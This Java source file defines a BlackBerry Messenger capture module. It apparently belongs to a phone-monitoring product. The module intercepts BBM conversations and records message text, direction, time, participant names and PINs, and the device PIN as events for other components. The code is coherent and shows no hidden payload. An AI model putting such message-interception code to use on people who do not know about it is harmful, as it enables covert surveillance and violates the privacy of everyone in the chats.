package com.vvt.bbm;

import java.util.Vector;
import com.vvt.event.FxEventCapture;
import com.vvt.event.FxIMEvent;
import com.vvt.event.FxParticipant;
import com.vvt.event.constant.FxDirection;
import com.vvt.event.constant.FxIMService;
import com.vvt.std.Log;
import com.vvt.std.PhoneInfo;

public class BBMCapture extends FxEventCapture implements BBMConversationListener {
	
	private BBMEngine bbmEngine = new BBMEngine();
	
	public void startCapture() {
		try {
			if (!isEnabled() && sizeOfFxEventListener() > 0) {
				setEnabled(true);
				bbmEngine.setBBMConversationListener(this);
				bbmEngine.start();
			}
		} catch(Exception e) {
			resetBBMCapture();
			notifyError(e);
		}
	}

	public void stopCapture() {
		try {
			if (isEnabled()) {
				setEnabled(false);
				bbmEngine.removeBBMConversationListener();
				bbmEngine.stop();
			}
		} catch(Exception e) {
			resetBBMCapture();
			notifyError(e);
		}
	}
	
	private void resetBBMCapture() {
		setEnabled(false);
	}

	// BBMConversationListener
	public void BBMConversation(Conversation conversation) {
		FxIMEvent imEvent = new FxIMEvent();
		int direction = conversation.getDirection();
		if (direction == FxDirection.UNKNOWN.getId()) {
			imEvent.setDirection(FxDirection.UNKNOWN);
		} else if (direction == FxDirection.IN.getId()) {
			imEvent.setDirection(FxDirection.IN);
		} else if (direction == FxDirection.OUT.getId()) {
			imEvent.setDirection(FxDirection.OUT);
		}
		imEvent.setEventTime(conversation.getCaptureTime());
		imEvent.setMessage(conversation.getContent());
		imEvent.setServiceID(FxIMService.BBM);
		imEvent.setUserDisplayName(conversation.getOwnerDisplayName());
		imEvent.setUserID(PhoneInfo.getPIN());
		Vector participants = conversation.getParticipants();
		Vector pins = conversation.getPINs();
		for (int i = 0; i < participants.size(); i++) {
			FxParticipant participant = new FxParticipant();
			participant.setUid((String)pins.elementAt(i));
			participant.setName((String)participants.elementAt(i));
			imEvent.addParticipant(participant);
		}
		notifyEvent(imEvent);
	}

	public void setupCompleted() {
	}

	public void setupFailed(String errorMsg) {
		Log.error("BBMCapture.setupFailed", "errorMsg = " + errorMsg);
	}

	public void stopCompleted() {
	}

	public void stopFailed(String errorMsg) {
		Log.error("BBMCapture.stopFailed", "errorMsg = " + errorMsg);
	}
}
